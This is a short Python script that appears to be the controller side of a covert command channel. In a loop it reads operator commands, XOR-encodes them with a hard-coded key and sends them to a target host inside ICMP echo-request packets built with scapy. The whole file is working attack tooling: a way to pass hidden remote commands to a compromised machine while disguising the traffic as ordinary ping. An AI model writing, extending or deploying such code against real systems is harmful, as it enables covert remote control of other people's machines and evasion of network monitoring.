#!/usr/bin/env python3

# start the program
# ask a user for an input command to the source
# send the command over in some encoded way
#   craft the packet
# wait for new command

from scapy.all import send
from scapy.layers.inet import IP, ICMP

target = "0.0.0.0"  # this is a default value
key = "ringring"


def XOREncrypt(message):
    """
    Encrypt a message using the XOR cipher with the given key.
    """
    global key
    key_bytes = key.encode()
    ciphertext = bytearray()
    for i, b in enumerate(message.encode()):
        ciphertext.append(b ^ key_bytes[i % len(key_bytes)])
    return ciphertext.hex()


def makeICMPPacket(command):
    global target
    toBeSent = IP(dst=target) / ICMP(type=8) / XOREncrypt(command)
    send(toBeSent, verbose=False)


# start program
def main() -> None:
    from sys import argv

    global target
    target = argv[1]
    while 1:
        command_input = str(input("Command input >> "))
        makeICMPPacket(command_input)


if __name__ == "__main__":
    main()
